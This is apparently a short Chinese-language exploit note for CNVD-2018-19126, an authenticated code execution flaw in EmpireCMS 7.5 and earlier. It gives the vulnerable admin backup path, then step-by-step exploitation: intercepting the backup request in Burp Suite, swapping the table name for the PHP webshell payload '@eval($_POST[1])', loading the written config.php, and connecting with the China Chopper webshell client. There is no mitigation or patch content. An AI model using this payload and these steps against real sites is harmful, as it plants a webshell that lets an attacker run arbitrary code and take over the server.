### CNVD-2018-19126 EmpireCMS后台任意代码执行可GetShell  <=7.5

帝国CMS
[漏洞位置]
/e/admin/admin/ebak/phome.php
[系统]-[系统设置]-[备份与恢复数据]-[备份数据]
[漏洞利用]
在[系统]-[系统设置]-[备份与恢复数据]-[备份数据]，选择任意数据表。

使用Burpsuit截取数据包。将表名修改为一句话***。

#字段
tablename[]=xxxxxxxx
# 修改为：
tablename[]=@eval($_POST[1])
在[系统]-[系统设置]-[备份与恢复数据]-[管理备份目录]处，点击查看备份说明。

点击[查看备份说明]，将URL结尾处的readme.txt修改为config.php

使用菜刀连接。
